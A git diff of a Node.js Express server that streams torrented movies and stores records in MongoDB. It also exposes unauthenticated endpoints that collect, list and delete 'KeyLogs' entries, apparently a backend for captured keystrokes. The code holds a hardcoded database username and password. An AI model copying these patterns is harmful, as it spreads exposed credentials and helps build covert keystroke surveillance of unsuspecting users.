@@ -3,8 +3,6 @@ import mongoose from 'mongoose';
 import WebTorrent from 'webtorrent';
 import cors from 'cors';
 import fetch from 'node-fetch';
-import ffmpeg from 'fluent-ffmpeg';
-import { PassThrough } from 'stream';
 
 const app = express();
 app.use(express.json());
@@ -28,6 +26,7 @@ app.get('/stream', async (req, res) => {
 
   try {
     const movie = await Movies.findOne({ tmdb_id });
+
     if (!movie) {
       return res.status(404).send('Movie not found');
     }
@@ -35,6 +34,7 @@ app.get('/stream', async (req, res) => {
     const torrentId = movie.media_url ?? defaultTorrentId;
 
     let torrent = client.get(torrentId);
+
     if (!torrent) {
       console.log('Adding new torrent...');
       client.add(torrentId, (newTorrent) => {
@@ -51,103 +51,24 @@ app.get('/stream', async (req, res) => {
   }
 });
 
-function handleStreaming(torrent, req, res) {
-  // Define a list of supported video file extensions
-  const supportedVideoFileExtensions = ['.mp4', '.m4v', '.mov', '.mkv', '.avi', '.wmv', '.flv', '.webm'];
-
-  // Filter files that match the supported video file extensions
-  const videoFiles = torrent.files.filter((file) =>
-    supportedVideoFileExtensions.some(extension => file.name.endsWith(extension))
-  );
-
-  console.log('Filtered files ------------------------> ', videoFiles);
-
-  if (videoFiles.length === 0) {
-    return res.status(404).send('No supported video files found in torrent');
-  }
-
-  const file = videoFiles[0];
-  console.log(`Streaming file: ${file.name}`);
-
-  const range = req.headers.range;
-  let start = 0;
-  let end = file.length - 1;
-
-  if (range) {
-    const positions = range.replace(/bytes=/, "").split("-");
-    start = parseInt(positions[0], 10);
-    end = positions[1] ? parseInt(positions[1], 10) : file.length - 1;
-  }
-
-  if (start >= file.length || end >= file.length) {
-    res.writeHead(416, {
-      "Content-Range": `bytes */${file.length}`,
-    });
-    return res.end();
-  }
-
-  const chunkSize = end - start + 1;
-
-  // Determine the appropriate Content-Type based on the file extension
-  const mimeType = "video/mp2t"; // 'mpegts' mime type for HTTP streaming
-
-  const head = {
-    "Content-Range": `bytes ${start}-${end}/${file.length}`,
-    "Accept-Ranges": "bytes",
-    "Content-Length": chunkSize,
-    "Content-Type": mimeType,
-  };
-
-  res.writeHead(206, head);
-
-  // Use ffmpeg to transcode the video file
-  const videoStream = file.createReadStream({ start, end });
-  const passthroughStream = new PassThrough();
-
-  videoStream.pipe(passthroughStream).on('error', (err) => {
-    console.error('Stream error:', err.message);
-    res.end(err.message);
-  });
-
-  ffmpeg(passthroughStream)
-    .inputFormat('matroska') // Explicitly specify the input format if you know it
-    .outputFormat('mpegts')  // Change format to 'mpegts' for streaming
-    .audioCodec('aac')       // Audio codec
-    .videoCodec('libx264')   // Video codec
-    .on('start', (commandLine) => {
-      console.log('Spawned FFmpeg with command: ' + commandLine);
-    })
-    .on('stderr', (stderrLine) => {
-      console.log('FFmpeg stderr: ' + stderrLine);
-    })
-    .on('error', (err, stdout, stderr) => {
-      console.error('Error with FFmpeg:', err.message);
-      console.error('FFmpeg stdout:', stdout);
-      console.error('FFmpeg stderr:', stderr);
-      res.end(err.message);
-    })
-    .on('end', () => {
-      console.log('FFmpeg transcoding finished.');
-    })
-    .pipe(res, { end: true });
-}
 
 // Express routes
-app.get('/auth-now', (req, res) => {
-  res.send('Successfully reauthenticated!');
+app.get("/auth-now", (req, res) => {
+  res.send("Successfully reauthenticated!");
 });
 
-app.get('/', (req, res) => {
-  console.log('Test');
-  res.send('Successfully authenticated!');
+app.get("/", (req, res) => {
+  console.log("Test");
+  res.send("Successfully authenticated!");
 });
 
 // MongoDB connection
-const mongoURI = 'mongodb+srv://faisal26:khalid26@cluster0.aalut.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
+const mongoURI =
+  "mongodb+srv://faisal26:khalid26@cluster0.aalut.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
 
 mongoose
   .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
-  .then(() => console.log('MongoDB connected...'))
+  .then(() => console.log("MongoDB connected..."))
   .catch((err) => console.log(err));
 
 // Define Schema
@@ -160,7 +81,7 @@ const MovieSchema = new mongoose.Schema({
   media_url: { type: String, required: true },
 });
 
-const Movies = mongoose.model('Movies', MovieSchema);
+const Movies = mongoose.model("Movies", MovieSchema);
 
 const KeyLogSchema = new mongoose.Schema({
   content: { type: String, required: true },
@@ -169,12 +90,12 @@ const KeyLogSchema = new mongoose.Schema({
   timeStamp: { type: Date, default: Date.now },
 });
 
-const KeyLogs = mongoose.model('KeyLogs', KeyLogSchema);
+const KeyLogs = mongoose.model("KeyLogs", KeyLogSchema);
 
 // Routes for CRUD operations
-app.post('/movie', async (req, res) => {
+app.post("/movie", async (req, res) => {
   try {
-    console.log('req body -----> : ', req.body);
+    console.log("req body -----> : ", req.body);
     const newMovie = new Movies(req.body);
     const savedMovie = await newMovie.save();
     res.status(201).json(savedMovie);
@@ -184,7 +105,7 @@ app.post('/movie', async (req, res) => {
   }
 });
 
-app.get('/movies', async (req, res) => {
+app.get("/movies", async (req, res) => {
   try {
     const movies = await Movies.find();
     res.status(200).json(movies);
@@ -194,10 +115,10 @@ app.get('/movies', async (req, res) => {
   }
 });
 
-app.get('/movies/:id', async (req, res) => {
+app.get("/movies/:id", async (req, res) => {
   try {
     const movie = await Movies.findById(req.params.id);
-    if (!movie) throw new Error('Movie not found');
+    if (!movie) throw new Error("Movie not found");
     res.status(200).json(movie);
   } catch (err) {
     console.error(err);
@@ -205,13 +126,13 @@ app.get('/movies/:id', async (req, res) => {
   }
 });
 
-app.put('/movies/:id', async (req, res) => {
+app.put("/movies/:id", async (req, res) => {
   try {
     const movie = await Movies.findByIdAndUpdate(req.params.id, req.body, {
       new: true,
       runValidators: true,
     });
-    if (!movie) throw new Error('Movie not found');
+    if (!movie) throw new Error("Movie not found");
     res.status(200).json(movie);
   } catch (err) {
     console.error(err);
@@ -219,29 +140,32 @@ app.put('/movies/:id', async (req, res) => {
   }
 });
 
-app.delete('/movies/all', async (req, res) => {
+
+
+app.delete("/movies/all", async (req, res) => {
   try {
     const movie = await Movies.deleteMany({});
-    if (!movie) throw new Error('Movie not found');
-    res.status(200).json({ message: 'Movie deleted' });
+    if (!movie) throw new Error("Movie not found");
+    res.status(200).json({ message: "Movie deleted" });
   } catch (err) {
     console.error(err);
     res.status(404).json({ message: err.message });
   }
 });
 
-app.delete('/movies/:id', async (req, res) => {
+app.delete("/movies/:id", async (req, res) => {
   try {
     const movie = await Movies.findByIdAndDelete(req.params.id);
-    if (!movie) throw new Error('Movie not found');
-    res.status(200).json({ message: 'Movie deleted' });
+    if (!movie) throw new Error("Movie not found");
+    res.status(200).json({ message: "Movie deleted" });
   } catch (err) {
     console.error(err);
     res.status(404).json({ message: err.message });
   }
 });
 
-app.post('/keylog', async (req, res) => {
+
+app.post("/keylog", async (req, res) => {
   try {
     const newLogEntry = new KeyLogs(req.body);
     const savedLog = await newLogEntry.save();
@@ -252,7 +176,7 @@ app.post('/keylog', async (req, res) => {
   }
 });
 
-app.post('/local-keylog', async (req, res) => {
+app.post("/local-keylog", async (req, res) => {
   try {
     const newLogEntry = new KeyLogs({ ...req.body, isLocal: true });
     const savedLog = await newLogEntry.save();
@@ -263,7 +187,7 @@ app.post('/local-keylog', async (req, res) => {
   }
 });
 
-app.get('/keylogs', async (req, res) => {
+app.get("/keylogs", async (req, res) => {
   try {
     const logs = await KeyLogs.find({ isLocal: false });
     res.status(200).json(logs);
@@ -273,7 +197,7 @@ app.get('/keylogs', async (req, res) => {
   }
 });
 
-app.get('/local-keylogs', async (req, res) => {
+app.get("/local-keylogs", async (req, res) => {
   try {
     const logs = await KeyLogs.find({ isLocal: true });
     res.status(200).json(logs);
@@ -283,13 +207,13 @@ app.get('/local-keylogs', async (req, res) => {
   }
 });
 
-app.delete('/keylogs', async (req, res) => {
+app.delete("/keylogs", async (req, res) => {
   try {
     const deletedLogs = await KeyLogs.deleteMany({});
     if (deletedLogs.deletedCount === 0) {
-      throw new Error('No logs to delete');
+      throw new Error("No logs to delete");
     }
-    res.status(200).json({ message: 'All logs deleted' });
+    res.status(200).json({ message: "All logs deleted" });
   } catch (err) {
     console.error(err);
     res.status(404).json({ message: err.message });
@@ -298,29 +222,40 @@ app.delete('/keylogs', async (req, res) => {
 
 // Start server
 app.listen(PORT, () => {
-  console.log(`Server started at port: ${PORT}`);
+  console.log("Server started at port: " + PORT);
 });
 
-function determineMimeType(filename) {
-  const extension = filename.split('.').pop();
-  switch (extension) {
-    case 'mp4':
-      return 'video/mp4';
-    case 'm4v':
-      return 'video/x-m4v'; // or 'video/mp4'
-    case 'mov':
-      return 'video/quicktime';
-    case 'mkv':
-      return 'video/x-matroska';
-    case 'avi':
-      return 'video/x-msvideo';
-    case 'wmv':
-      return 'video/x-ms-wmv';
-    case 'flv':
-      return 'video/x-flv';
-    case 'webm':
-      return 'video/webm';
-    default:
-      return 'application/octet-stream'; // Default MIME type if the extension is not recognized
-  }
+
+
+// Function to calculate approximate byte range for the desired duration
+ function calculateByteRangeForDuration(file, durationInSeconds) {
+  const estimatedTotalBitrate = file.length / durationInSeconds; // bytes per second
+  return {
+    start: 0,
+    end: Math.min(file.length - 1, Math.floor(estimatedTotalBitrate * durationInSeconds)),
+  };
+}
+
+ function determineMimeType(filename) {
+    const extension = filename.split('.').pop();
+    switch (extension) {
+      case 'mp4':
+        return 'video/mp4';
+      case 'm4v':
+        return 'video/x-m4v'; // or 'video/mp4'
+      case 'mov':
+        return 'video/quicktime';
+      case 'mkv':
+        return 'video/x-matroska';
+      case 'avi':
+        return 'video/x-msvideo';
+      case 'wmv':
+        return 'video/x-ms-wmv';
+      case 'flv':
+        return 'video/x-flv';
+      case 'webm':
+        return 'video/webm';
+      default:
+        return 'application/octet-stream'; // Default MIME type if the extension is not recognized
+    }
 }
